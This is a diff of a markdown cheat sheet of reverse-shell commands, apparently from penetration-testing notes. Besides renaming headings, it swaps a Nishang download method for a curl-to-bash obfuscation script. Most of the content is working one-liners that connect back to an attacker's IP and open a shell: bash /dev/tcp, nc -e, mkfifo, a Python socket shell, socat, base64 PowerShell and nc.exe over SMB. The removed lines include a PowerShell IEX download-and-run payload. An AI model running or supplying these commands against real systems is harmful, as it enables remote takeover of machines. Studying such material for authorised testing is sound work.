@@ -1,12 +1,12 @@
 # Reverse Shells
 
-### Reverse Shells
+## Reverse Shells
 
-#### Reverse Shell Generator
+### Reverse Shell Generator
 
 [https://www.revshells.com/](https://www.revshells.com/)
 
-#### Bash
+### Bash
 
 ```bash
 bash -i >& /dev/tcp/<ip>/<port> 0>&1
@@ -26,19 +26,19 @@ echo "bash -i >& /dev/tcp/<ip>/<port> 0>&1" | base64 | base64
 echo <b64_code> | base64 -d | base64 -d | bash
 ```
 
-#### Netcat
+### Netcat
 
 ```bash
 nc -e /bin/bash <ip> <port>
 ```
 
-#### Mkfifo
+### Mkfifo
 
 ```bash
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ip> <port> >/tmp/f
 ```
 
-#### Python3
+### Python3
 
 {% code overflow="wrap" %}
 ```bash
@@ -46,13 +46,13 @@ i="<ip>" p=<port> && echo "import socket,subprocess,os;s=socket.socket(socket.AF
 ```
 {% endcode %}
 
-#### Socat
+### Socat
 
 ```bash
 socat tcp-connect:<ip>:<port> exec:/bin/bash,pty,stderr,setsid,sigint,sane
 ```
 
-#### PowerShell
+### PowerShell
 
 **Base64**
 
@@ -66,23 +66,17 @@ powershell -e <b64_code>
 ```
 {% endcode %}
 
-**Nishang**
+#### **Obfuscated**
 
 Run this on your local machine:
 
 {% code overflow="wrap" %}
 ```bash
-i="<ip>" p=<port> && curl -sL https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1 -o rs.ps1 && echo "Invoke-PowerShellTcp -Reverse -IPAddress $i -Port $p" >> rs.ps1 && python3 -m http.server 80
+bash <(curl -s https://raw.githubusercontent.com/villalbanico9/H4Ts/main/Tools/Reverse%20Shells/obfuscate_ps_reverse_tcp.sh) <ip> [<port>]
 ```
 {% endcode %}
 
-And while running the python http server, execute this on the target:
-
-```powershell
-powershell "IEX(New-Object Net.WebClient).downloadString('http://<ip>/rs.ps1')" 
-```
-
-**Netcat**
+### **Netcat**
 
 Locate "nc.exe" and copy it to your current directory, then run this on your local machine:
 
@@ -96,7 +90,7 @@ And while running the smb server, execute this on the target:
 \\<ip>\smbShare\nc.exe -e cmd <ip> <port>
 ```
 
-### Interactive TTY
+## Interactive TTY
 
 {% hint style="info" %}
 It is also possible to use `rlwrap` when starting your listening socket:
